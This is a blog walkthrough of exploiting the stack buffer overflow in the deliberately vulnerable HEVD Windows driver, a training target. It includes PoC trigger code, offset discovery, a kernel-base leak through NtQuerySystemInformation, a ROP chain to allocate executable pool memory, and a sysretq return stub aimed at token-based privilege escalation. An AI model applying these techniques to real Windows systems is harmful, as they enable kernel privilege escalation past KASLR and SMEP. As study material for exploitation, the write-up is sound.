## Introduction
{: .mt-4 .mb-0 }

This series will highlight my experience with the HackSys Extremely Vulnerable Driver (HEVD) as I delve into learning Windows kernel exploitaiton :tada: I intentionally left out the initial steps in getting started - loading & running the driver and setting up kernel debugging - as I have already wrote an article on it [here](https://0reome1ster.github.io/posts/Windows-Kernel-Debugging). For this and future WKE posts, feel free to checkout my [WKE repo](https://github.com/0reome1ster/WKE) to see full source as opposed to code snippets! I am following a guide, <https://mdanilor.github.io/posts/hevd-0/>, to help orient myself during this first exploit so check it out!

## The Initial Crash
{: .mt-4 .mb-0 }

The nature of the BSoD provides a major hint in to where and what's vulnerable. In our case, we have the source; however, in this example, you can do a backtrace, see around where it's crashing, and view what memory mappings the affected address is in (e.g. stack, heap, etc.).

### Vulnerable Code
{: data-toc-skip='' .mt-4 .mb-0 }

```cpp
(...)
    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };

(...)

    ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

    DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
    DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
    DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
    DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));

(...)

    DbgPrint("[+] Triggering Buffer Overflow in Stack\n");

    //
    // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
    // because the developer is passing the user supplied size directly to
    // RtlCopyMemory()/memcpy() without validating if the size is greater or
    // equal to the size of KernelBuffer
    //

    RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);

(...)
```

The above comment succintly summarizes the vulnerability within `TriggerBufferOverflowStack` - the user-controlled size variable is passed to `RtlCopyMemory` (a Windows wrapper of memcpy) without any size checks. This allows an attacker to write an arbitrary amount of data to the destination buffer `KernelBuffer`, enabling a stack buffer overflow.

> This is a stack BoF because `KernelBuffer` is allocated on the stack; it could be a heap BoF if it was allocated with any of the various Windows heap APIs.
{:.prompt-info} 

### PoC Snippet
{: data-toc-skip='' .mt-4 .mb-0 }
```cpp
void StackOverflow(int pid)
{
	HANDLE driverHandle = GetHandle(DEVICE_NAME);
	int bufSize = 4096;
	DWORD bytesReturned = 0;

	LPVOID buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);

	if (buf == NULL)
		return;

	memset(buf, 'A', bufSize);

	DeviceIoControl(driverHandle, HEVD_StackOverflow, buf, bufSize, NULL, 0, &bytesReturned, NULL);

	HeapFree(GetProcessHeap(), 0, buf);
}
```

### Triggering the BoF
{: data-toc-skip='' .mt-4 .mb-0 }

Running the exploit code, we can see we triggered a crash.

![Buffer Overflow BSoD](/assets/images/WKE/StackOverflow/StackOverflow1.png)

## Determining Offset
{: .mt-4 .mb-0 }

Since we know that it roughly takes 4096 (0x1000) bytes to trigger the BoF, we can use Metasploit Framework's `msf-pattern_create` tool to generate a unqiue paylod to quickly ascertain the offset.

![msf-pattern_create](/assets/images/WKE/StackOverflow/pattern_create.png)

```cpp
const char* pattern = "<truncated for brevity>";

void StackOverflow(int pid)
{
	HANDLE driverHandle = GetHandle(DEVICE_NAME);
	int bufSize = 4096;
	DWORD bytesReturned = 0;

	LPVOID buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);

	if (buf == NULL)
		return;

	// memset(buf, 'A', bufSize);
	memcpy(buf, pattern, bufSize);

	DeviceIoControl(driverHandle, HEVD_StackOverflow, buf, bufSize, NULL, 0, &bytesReturned, NULL);

	HeapFree(GetProcessHeap(), 0, buf);
}
```

> I do recognize that I could've directly passed `pattern` through the ioctl call; however, I didn't feel like changing variable names back-and-forth.
{: .prompt-info}

I recompiled my exploit binary and re-ran it on the VM to obtain the payload offset to overwrite RIP with.

![Stack BoF for offset](/assets/images/WKE/StackOverflow/StackOverflow2.png)

We can ignore the first column, `Child-SP`, and solely focus on `RetAddr`. We can see that the address it's trying to return to looks like a sequence of ASCII - 0x43, 0x32, 0x27, etc. We can extract this and paste it into another Metasploit Framework tool called `msf-pattern_offset` (very convenient naming).

![msf-pattern_offset](/assets/images/WKE/StackOverflow/pattern_offset.png)

> I added the help page because I forgot the flags and I thought it'd be good to show
{: .prompt-info}

Now that we know the offset, 2072 bytes, we can ROP our way into an Elevation of Privilege (EoP)...

## Writing Exploit Chain
{: .mt-4 .mb-0 }

This is where the fun, but also challenging, stuff happens. We first to leak the kernel base to circumvent the many modern kernel protections such as KASLR, SMEP, and KVA Shadow. I've decided to go with a Return Oriented Programming (ROP) approach as the memory we write our buffer to is non-executable, so a `jmp esp` gadget or similar wouldn't work here (we'd trigger an access violation). Also, writing a full ROP exploit chain is very tedious, I will use ROP to allocate executable memory and have shellcode do most of the lifting.

### Bypassing KASLR, SMEP, and KVA Shadow - Leaking Kernel Base
{: .mt-4 .mb-0 }

In this section, I will briefly go over a couple modern mitigations that make kernel exploitation more challenging such as KASLR, SMEP, and KVA Shadow; there are other protections/mitigations I will discuss further on in this series like HVCI, SMAP, CFI/CFG, and CET.

#### Kernal ASLR (KASLR)

KASLR (pronounced: k-as-ler) is simply, as the name states, ASLR for the kernel. Now, for those who don't know what ASLR is let me explain. Address Space Layout Randomization, or ASLR, is a mitigation aiming to defeat many exploits that rely on knowing exact locations in a program's memory layout (e.g. return addresses, function ptrs, etc.). With ASLR enabled, every time a program is ran, ASLR randomizes the locations/addresses of key parts like the stack, heap, and libraries; this makes it nearly impossible for an attacker to reliably determine specific memory locations in a running process, thus, killing the explot. The predominant method to bypass this protection is to leak an address and determine its offset from the base address.

#### Supervisor Mode Execution Prevention (SMEP)

So what exactly is *Supervisor Mode*?

Supervisor mode, aka privileged mode, is a mode of operation where the kernel has unrestricted access to all hardware and system resources; it's like running a commnd as root in Linux. 

SMEP prevents the execution of user-mode code in the context of the kernel, aka supervisor mode. This security feature is managed by the CPU (hardware) and is stored on the 20th bit of the `cr4` register; it's enabled by default on Windows 8 and above.

Since this blog exists, there are a couple ways to disable or bypass SMEP:

1. Set the 20th bit on the `cr4` register to 0
2. Never execute user-mode code and ROP in the kernel

#### KVA Shadow aka Windows Kernel Page-Table Isolation (KPTI)

Kernel Virtual Address (KVA) Shadow is a mitigation technique developed by Microsoft to address a specific speculative execution side-channel attack, known as "Meltdown" (CVE-2017-5754 - the rogue cache load vulnerability); this is quite literally the Windows variant of Kernel Page-Table Isolation (KPTI).

KVA Shadow and KPTI work (as the name suggests) by isolating kernel page tables from user page tables. This effectively prevents user-mode processes from accessing kernel memory. Even if SMEP is disabled, that still doesn't mean we can modify/access kernel memory with our shellcode.

#### NtQuerySystemInformation
{: .mt-4 .mb-0 }

Currently, as a medium IL process, you can obtain the kernel base through standard Windows APIs. In the walkthrough I mentioned in the introduction, mdanilor uses [EnumDeviceDrivers](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers) which is essentially a wrapper for [NtQuerySystemInformation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation). So I decided to try using `NtQuerySystemInformation` to obtain the kernel base.

> A medium IL process is essentially a standard-user process, see more [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)
{: .prompt-info}

```cpp
typedef struct _SYSTEM_MODULE {
    PVOID  Reserved[2];
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR   ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
```

I got these struct definitions (I've slightly altered them) from [here](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/windows-debugging-and-exploiting-part-4-ntquerysysteminformation/).

```cpp
DWORD GetKernelBase()
{
    ULONG len = 0;

    // 0xB respreset SYSTEM_INFORMATION_CLASS.SystemModuleInformation - it's been omitted 
    // from wininternl.h, but I've manually set the value here.
    NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0xB, NULL, 0, &len);

    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(len);

    if (pModuleInfo == nullptr)
    {
        DEBUG_ERROR(L"[!] Failed to allocate PSYSTEM_MODULE_INFORMATION struct!!\n");
        return STATUS_NO_MEMORY;
    }

    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0xB, pModuleInfo, len, &len);

    if (NT_SUCCESS(status))
    {
        DEBUG_SUCCESS(L"[+] Kernel Base @ 0x%llx\n", pModuleInfo->Modules[0].ImageBase);
        g_NtoskrnlBase = pModuleInfo->Modules[0].ImageBase;
    }
    else
    {
        DEBUG_ERROR(L"[!] Failed to retrive kernel base!!\n");
    }
        
    free(pModuleInfo);
    return !NT_SUCCESS(status);
}
```
> To obtain image bases for other kernel processes, like drivers, you can enumerate the `pModuleInfo->Modules` instead of just accessing `ntoskrnl.exe` at the zero index.
{: .prompt-tip}

```cpp
PVOID GetKernelSymbol(const char* symbolName)
{
    HMODULE ntoskrnlHandle;
    PCHAR symbolAddr;
    unsigned long long offset;

    ntoskrnlHandle = LoadLibraryA("C:\\Windows\\System32\\ntoskrnl.exe");

    if (ntoskrnlHandle == nullptr)
        return NULL;

    symbolAddr = (PCHAR)GetProcAddress(ntoskrnlHandle, symbolName);

    if (symbolAddr == nullptr)
        return NULL;

    offset = symbolAddr - (PCHAR)ntoskrnlHandle;

    return (PVOID)((PCHAR)g_NtoskrnlBase + offset);
}
```

> I subtract with `ntoskrnlHandle` because the symbol's address is based with `ntoskrnlHandle` (the handle to `ntoskrnl.exe`) instead of the actual kernel base.
{: .prompt-info}

Now that we've acquired the kernel base, we have **DEFEATED** kASLR and circumvented SMEP & KVA Shadow and can now ROP our way to victory

### ROP-ing to Shellcode
{: .mt-4 .mb-0 }

Generally, the idea of ROP-ing to shellcode is writing to an executable page of memory and "jumping" to our shellcode. In user-mode, we can just call mprotect and just write to arbitrary memory without regard for the program; however, altering arbitrary kernel memory could lead to system crashes (and we don't want that). So, we will allocate our own executable memory using `ExAllocatePoolWithTag()`, write shellcode to it, and jump to our shellcode in kernel memory.

```
PVOID ExAllocatePoolWithTag(
  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
  [in] SIZE_T                                         NumberOfBytes,
  [in] ULONG                                          Tag
);
```
Here's how we'll set up the args:
- The first parameter, `POOL_TYPE`, will be `0` which means [Non-paged Pool](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type) - this will be set in `rcx`
- The second parameter dictates the size, so this can be whatever you want (I'll use `4096`) - this will be set in `rdx`
- The third parameter is for the [tag](https://techcommunity.microsoft.com/blog/askperf/an-introduction-to-pool-tags/372983), which from my understanding can be anything (there's no checks) - this will be set in `r8`

Our ROP chain should *ideally* look something like this:

```
xor rcx, rcx; ret; --> zero the rcx register, which is the 1st arg of ExAllocatePoolWithTag
pop rdx; ret; --> 2nd arg for ExAllocatePoolWithTag, which is the allocation size
0x1000 --> size of memory to allocate, 4096 bytes
ExAllocatePoolWithTag() --> Since we're ropping we can just store func ptrs in the chain - the return value, address of the allocated pool, will be stored in rax
mov rcx, rax; ret; --> 1st arg for memcpy, which is dst buffer
pop rdx; ret; --> 2nd arg for memcpy, which is the src buffer
<address of shellcode> 
pop r8; ret; --> 3rd arg for memcpy, which is the size of data to copy
<size of shellcode>
memcpy() --> Copy userland shellcode into executable kernel memory
jmp rcx; --> Jump to our shellcode in the kernel
```
In general, our plan is to:
1. Create a writable and executable segment of memory in kernel-space
2. Write our userland shellcode to our allocated memory segment in kernel-land
3. Jump to our kernel-land shellcode and execute it

Of course, writing your ROP chain isn't as simple as you'd hope, just like in our case. Here's the actual chain that I'll be using:

```
xor ecx, ecx; mov rax, rcx; ret; --> Zeroes out rcx, and rax (which isn't important)
pop rdx; ret; --> Pop allocation size into rbx
0x1000
ExAllocatePoolWithTag() --> Give us memory pls
add rsp, 0x20; ret; OR add rsp, 0x18; ret; --> Shadow space 
push rax; pop rbx; ret; --> Save executable pool addr, so we can jump to it later
pop rdx; ret; --> Popping buffer addr to rdx to guarantee writable pointer
<BUF ADDR>
add rcx, rax; mov qword ptr [rdx + 0x18], rcx; ret; --> Add pool addr to rcx, it's offsetted by 0x10 in my specific case
pop rax; ret;
0x10 --> Difference between original rcx and current rcx
sub rcx, rax; mov rax, rcx; ret; --> Remove the 0x10 offset from rcx to get proper pool addr
pop rdx; ret; --> Pop addr of userland shellcode into rdx
<ADDR OF SHELLCODE>
pop r8; ret; --> Pop size of shellcode into r8
<SIZE OF SHELLCODE>
memcpy() --> Write our shellcode pls
jmp rbx; --> Saved 
```

### Writing Shellcode
{: .mt-4 .mb-0 }

Our shellcode needs to perform the following actions:

1. Steal/copy the SYSTEM token
2. Overwrite the specified PID's token with SYSTEM (acquired in step 1)
    - Modify the number of handles to SYSTEM token to UINT max: 0xFFFFFFFFFFFFFFFF <-- this avoids accidental blue screens
3. Return to user-mode safely

> A caveat here (for steps 1 & 2) is that we can just express all permissions on the PID's token, which is effectively achieves the same thing
{: .prompt-info}

Having shellcode that steals the SYSTEM token is a good thing to have, so I might do both.

![20 years later spongebob](/assets/images/WKE/StackOverflow/20yearslater.png)

It took me *wayyy* longer than it should've, but I'm a busy guy, so what can I say. The trickiest part was returning to user-mode/user-land safely without triggering a BSOD.

My shellcode is a culmination of inspiration from **mdanilor** and [Kristal](https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html). I liked the idea of using kernel functions like `PsReferencePrimaryToken` and `PsLookupProcessByProcessId` to obtain crucial kernel structures without needing to use hard-coded offsets (I like portable exploits). Now, you could do research on all the offsets and do it through assembly only, *butttt* that's a lot of work. The latter half of my shellcode is responsible for returning to user-mode, and that utilizes offsets (and I plan on making that more portable).

The shellcode I wrote is the 2nd option I listed - expressing all the permissions on my process's token. Token stealing is somewhat a similar process and I'll probably write it in another post.

```

    mov rsp, [rdx + 0x180]                   ; Obtain _KTHREAD.TrapFrame.Rsp
    mov rbp, [rdx + 0x158]                   ; Obtain _KTHREAD.TrapFrame.Rbp
    xor edx, edx                             ; Zero out edx like KiSystemCall64
    xor eax, eax                             ; Zero out eax
    swapgs                                   ; Set user-mode registers
    sysretq                                  ; Return to user-land
```
{: file="token_manip.asm" }

The last stub of my assembly handles returning to user-mode. What I'm essentially attempting to do is restore the user-mode trap frame from when we call IOCTL from our exploit. We restore important registers like `rsp`, `rbp`, `rip`, along with CPU state with EFlags. Doing this allows us to safely transition back to user-mode from the kernel.

## Reflection
{: .mt-4 .mb-0 }

This PoC took way longer than expected, and writing this blog took even longer, however, there's some fixes I want to improve on in the future:

1. Reduce the number of `ntoskrnl.exe` loads into my PoC
    - An idea is that I could "walk" `ntoskrnl.exe` and resolve API offsets manually
2. Create a data structure to dynamically store kernel APIs I need to resolve

I could probably call `LoadLibraryA` once, and resolve all of the APIs I might need, through some iterative loop. A dicitonary data structure would work here - in C++, we can use an unordered map to achieve this as follows:

```cpp
#include <unordered_map>

void some_function()
{
    std::unordered_map<std::string, unsigned long long> k_apis;

    k_apis["PsLookupProcessByProcessId"] = NULL;

    (...)

    for (const auto& mapping : k_apis) {
        k_apis[mapping.first] = (ULONG64)((GetProcAddress(ntoskrnlHandle, mapping.first.c_str()) - ntoskrnlHandle) + g_NtoskrnlBase);
    }
}
```
